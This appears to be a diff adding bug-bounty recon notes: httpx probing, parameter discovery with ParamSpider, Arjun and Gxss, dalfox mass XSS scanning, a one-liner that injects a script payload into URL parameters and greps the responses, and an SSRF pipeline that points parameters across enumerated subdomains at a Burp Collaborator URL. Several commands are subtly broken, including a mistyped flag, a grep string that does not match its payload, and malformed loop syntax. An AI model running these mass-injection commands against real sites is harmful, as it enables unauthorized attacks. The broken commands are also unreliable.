@@ -49,3 +49,36 @@ Recon for Bugbounty
       skipfish
       uniscan
       
+
+httpx -mc 200 -l url.txt
+
+httpx -mc 200 -sc -tech -title -ip -probe -l url.txt
+
+httpx -mc 200 -sc -p 8080 -l url.txt
+
+httpx -mc 200,403,404 -sc -tech -ct -csv -o data.csv -l url.txt
+
+
+
+1.ParamSpider
+2.Gxss
+3. Dalfox
+
+#ParamSpider 
+python3 paramspider.py --domail abcd.com --exclude png,svg,jpg,jpeg
+
+#Arjun
+arjun -u targeturl?=FUZZ
+
+cat url.txt | Gxss -p ABCD
+
+cat url.txt | Gxss -p ABCD | dalfox pipe -mining-dict param.txt --skip-bav
+cat url.txt | Gxss -p ABCD | dalfox pipe --mass
+
+
+
+cat url.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confitm(1)" && echo "$host \033{0;31mVulnerable\n}"; done
+
+
+SSRF
+findomain -t domain.com -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://BurpCollabratorURL
